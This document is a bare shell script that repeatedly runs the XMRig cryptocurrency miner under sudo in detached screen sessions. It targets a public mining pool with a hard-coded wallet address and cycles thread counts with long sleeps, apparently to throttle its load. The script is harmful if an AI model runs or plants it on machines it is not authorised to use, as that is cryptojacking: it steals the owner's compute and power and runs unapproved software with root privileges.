screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
